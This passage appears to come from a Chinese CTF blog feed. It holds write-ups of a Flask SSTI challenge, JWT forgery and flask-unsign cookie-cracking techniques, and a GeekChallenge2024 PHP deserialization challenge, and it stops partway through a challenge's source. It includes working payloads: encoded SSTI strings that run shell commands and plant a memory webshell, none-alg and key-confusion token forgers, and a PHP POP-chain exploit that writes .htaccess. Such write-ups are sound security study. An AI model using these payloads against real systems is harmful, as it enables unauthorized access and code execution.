class="built_in">print</span>(</span><br><span class="line">        <span class="string">f&quot;Proxy server is running on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> and forwarding to <span class="subst">&#123;target_host&#125;</span>:<span class="subst">&#123;target_port&#125;</span>...&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = server_socket.accept()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            thread = threading.Thread(</span><br><span class="line">                target=proxy_handler.handle_request, args=(client_socket,)</span><br><span class="line">            )</span><br><span class="line">            thread.daemon = <span class="literal">True</span></span><br><span class="line">            thread.start()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Shutting down proxy server...&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy_host = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    proxy_port = <span class="number">5001</span></span><br><span class="line">    target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    target_port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 安全反代，防止针对响应头的攻击</span></span><br><span class="line">    proxy_thread = threading.Thread(</span><br><span class="line">        target=start_proxy_server,</span><br><span class="line">        args=(proxy_host, proxy_port, target_host, target_port),</span><br><span class="line">    )</span><br><span class="line">    proxy_thread.daemon = <span class="literal">True</span></span><br><span class="line">    proxy_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Flask app...&quot;</span>)</span><br><span class="line">    run_flask_app()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render_template_string 类型是典型的 SSTI，题目不出网导致无法反弹 shell 带出,可谓 RCE 了却只能干瞪眼。<br>思路很多。盲注，写内存马，设置静态目录写文件应该都可以。<br><a href="https://blog.csdn.net/2301_80148821/article/details/143237394">https://blog.csdn.net/2301_80148821/article/details/143237394</a><br>利用这里的 before_function 钩子函数写内存马<br>理论上一个 16 进制能绕过所有过滤。这里为了可读性改了一下</p><pre><code>&#123;&#123;self['_''_init_''_']['_''_globals_''_']['_''_builtins_''_']['ev''al']("_""_imp""ort_""_('o''s').popen('whoami').read()")&#125;&#125;eval(&quot;__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('cat /flag').read())&quot;)最终payload：&#123;&#123;self['_''_init_''_']['_''_globals_''_']['_''_builtins_''_']['ev''al']("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x73\x79\x73\x27\x29\x2e\x6d\x6f\x64\x75\x6c\x65\x73\x5b\x27\x5f\x5f\x6d\x61\x69\x6e\x5f\x5f\x27\x5d\x2e\x5f\x5f\x64\x69\x63\x74\x5f\x5f\x5b\x27\x61\x70\x70\x27\x5d\x2e\x62\x65\x66\x6f\x72\x65\x5f\x72\x65\x71\x75\x65\x73\x74\x5f\x66\x75\x6e\x63\x73\x2e\x73\x65\x74\x64\x65\x66\x61\x75\x6c\x74\x28\x4e\x6f\x6e\x65\x2c\x5b\x5d\x29\x2e\x61\x70\x70\x65\x6e\x64\x28\x6c\x61\x6d\x62\x64\x61\x20\x3a\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x27\x29\x2e\x72\x65\x61\x64\x28\x29\x29")&#125;&#125;</code></pre><h1 id="流量题">流量题</h1><h2 id="zeroshell-1">zeroshell_1</h2><p>wireshark 直接搜 Zmxh 就拿到 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见jwt的工具使用和技巧</title>
      <link href="/posts/f984f665.html"/>
      <url>/posts/f984f665.html</url>
      
        <content type="html"><![CDATA[<h1 id="jwt-特性">jwt 特性</h1><p>jwt 原理就是 base64 编码，但 Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_。<br>所以如果有废弃的 cookie 被直接匹配过滤，可以试试替换增加无用字符，绕过 waf。</p><h1 id="自己加密-jwt">自己加密 jwt</h1><h2 id="none">none</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1667822180</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1667829380</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1667822180</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;237410127e2551647730b97941cdcae5&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><h2 id="HS256">HS256</h2><p>注释掉 jwt/algorithms.py 中的 raise InvalidKeyError</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&quot;./public.pem&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">header = &#123;<span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">payload = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;iat&quot;</span>: <span class="number">1667825552</span>&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    payload=payload, key=public, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=header  <span class="comment"># 密钥  # 加密方式</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RS256">RS256</h2><p>注释掉 jwt/algorithms.py 中的 raise InvalidKeyError</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&quot;./private.key&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">header = &#123;<span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>, <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">payload = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;iat&quot;</span>: <span class="number">1667825552</span>&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    payload=payload, key=private, algorithm=<span class="string">&quot;RS256&quot;</span>, headers=header  <span class="comment"># 密钥  # 加密方式</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="flask-unsign">flask_unsign</h1><h2 id="unsign">unsign</h2><p>unsign 带自动爆破功能</p><pre><code>flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'</code></pre><h2 id="decode">decode</h2><p>单纯解密，支持以.开头的 jwt 密钥</p><pre><code>flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8' --secret 'CHANGEME'</code></pre><h2 id="encode">encode</h2><p>用给定的字符串和密钥做 jwt 加密</p><pre><code>flask-unsign --sign --cookie &quot;&#123;'logged_in': True&#125;&quot; --secret 'CHANGEME'</code></pre><h2 id="利用字典爆破">利用字典爆破</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"><span class="keyword">from</span> flask_unsign.helpers <span class="keyword">import</span> wordlist</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/var/CTF/wordlists/rockyou.txt&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;.eJyrVkrJTMzJT48vLkktULIy1lFKS01NiU_OL80rUbIyNYXyC1LzUjLz0pWs0hJzilOBgjmJ6fFJJXkwhYa1AKtkGZI.aNJdCg.7SHgeZTIgC9kMNz0BIjGVgVV7NI&quot;</span></span><br><span class="line">obj = flask_unsign.Cracker(value=cookie)</span><br><span class="line"></span><br><span class="line">before = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wordlist(path, parse_lines=<span class="literal">False</span>) <span class="keyword">as</span> iterator:</span><br><span class="line">    obj.crack(iterator)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> obj.secret:</span><br><span class="line">    secret = obj.secret.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found SECRET_KET <span class="subst">&#123;secret&#125;</span> in <span class="subst">&#123;time.time()-before&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="RS256-转成-HS256-时的漏洞">RS256 转成 HS256 时的漏洞</h1><p>利用工具 rsa_sign2n,这个用到了 docker<br><a href="https://github.com/nu11secur1ty/rsa_sign2n">https://github.com/nu11secur1ty/rsa_sign2n</a><br>在 docker 里运行</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python3 jwt_forgery.py cookie1 cookie2</span><br></pre></td></tr></table></figure><p>将出现的公钥一个个在题目里尝试直到通过 jwt 验证。<br>比如 b305dd712d5d2378_65537_pkcs1.pem 通过了认证</p><p>javascript 重新签名 jwt:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./b305dd712d5d2378_65537_pkcs1.pem&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&quot;admin&quot;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br></pre></td></tr></table></figure><p>python 版本注意，因为 python 库的 jwt 最新版已经弃用了 pem 格式的公钥做为 HS256 的密钥<br>需要注释掉 jwt/algorithms.py 中的 raise InvalidKeyError 部分</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_key</span>(<span class="params">self, key: <span class="built_in">str</span> | <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">key_bytes = force_bytes(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if is_pem_format(key_bytes) or is_ssh_key(key_bytes):</span></span><br><span class="line">    <span class="comment">#     raise InvalidKeyError(</span></span><br><span class="line">    <span class="comment">#         &quot;The specified key is an asymmetric key or x509 certificate and&quot;</span></span><br><span class="line">    <span class="comment">#         &quot; should not be used as an HMAC secret.&quot;</span></span><br><span class="line">    <span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_bytes</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">publicKey = <span class="built_in">open</span>(<span class="string">&quot;./public.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIxIiwgImFkbWluIjogZmFsc2UsICJleHAiOiAxNzM0NjgyNDYyfQ.qnASkyTvWqYLn84Xa8i3e3uko6C1DfRpuPLHk4BIerM&quot;</span></span><br><span class="line"><span class="built_in">print</span>(publicKey)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    real = jwt.decode(token, publicKey, algorithms=[<span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(real)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    exit(e)</span><br><span class="line">ss = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;admin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    ss,</span><br><span class="line">    publicKey,</span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    real = jwt.decode(token, publicKey, algorithms=[<span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(real)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    exit(e)</span><br></pre></td></tr></table></figure><p>感兴趣的话可以去参考极客大挑战 2024 的 jwt_pickle</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekChallenge2024 Web+Misc+Crypto个人题解WP</title>
      <link href="/posts/c264f0a9.html"/>
      <url>/posts/c264f0a9.html</url>
      
        <content type="html"><![CDATA[<p><img src="/img/WP/GeekChallenge2024/%E6%88%90%E7%BB%A9.png" alt=""><br>我是极客大挑战2024第二名队里的web手<br>关注我们队的逆向手谢谢喵 <a href="http://www.czyerror.top">Error 的小破站</a></p><h1 id="Web">Web</h1><h2 id="100-的⚪">100%的⚪</h2><p>js代码搜atob能直接看到base64编码的flag<br><img src="/img/WP/GeekChallenge2024/sign.png" alt=""></p><h2 id="ezpop">ezpop</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目确实出到不会的考点了，反复调用的问题开始无法解决，导致一直空着，解题思路是在做第二个pop链的GC回收时看到的绕过反复调用<br><a href="https://blog.csdn.net/Jayjay___/article/details/130647484?spm=1001.2014.3001.5502">https://blog.csdn.net/Jayjay___/article/details/130647484?spm=1001.2014.3001.5502</a><br><img src="/img/WP/GeekChallenge2024/%E7%BB%95%E8%BF%87%E5%8F%8D%E5%A4%8D%E8%B0%83%E7%94%A8.png" alt=""><br>绕过方法为多实例化一个对象<br>一般的pop链连接不讲了，最后需要绕过死亡exit命令。<br>屏蔽了二次编码和一些直接写马的可能，好在我们不用RCE，可以不用尖括号<br>写个.htaccess文件，利用 <code>php_value auto_prepend_file &quot;/flag&quot;</code> 直接回显出flag<br>exp如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$S</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$l1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$l2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$G1</span>=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$G2</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$l1</span>-&gt;J1rry=<span class="string">&quot;data://text/plain,Welcome GeekChallenge 2024&quot;</span>;</span><br><span class="line"><span class="variable">$l1</span>-&gt;meimeng = <span class="variable">$G1</span>;</span><br><span class="line"><span class="variable">$G1</span>-&gt;GSBP = <span class="variable">$l2</span>;</span><br><span class="line"><span class="variable">$l2</span>-&gt;meimeng = <span class="variable">$G2</span>;</span><br><span class="line"><span class="variable">$G2</span>-&gt;GSBP = <span class="variable">$S</span>;</span><br><span class="line"><span class="comment">#&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span></span><br><span class="line"><span class="comment"># string.toupper</span></span><br><span class="line"><span class="comment"># string.tolower</span></span><br><span class="line"><span class="comment"># string.strip_tags</span></span><br><span class="line"><span class="variable">$S</span>-&gt;starven=<span class="string">&#x27;php://filter/string.strip_tags/?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/resource=.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$l1</span>);</span><br><span class="line"><span class="variable">$exp</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:7:&quot;meimeng&quot;&#x27;</span>, <span class="string">&#x27;S:7:&quot;m\65imeng&quot;&#x27;</span>, <span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><h2 id="not-just-pop">not_just_pop</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span 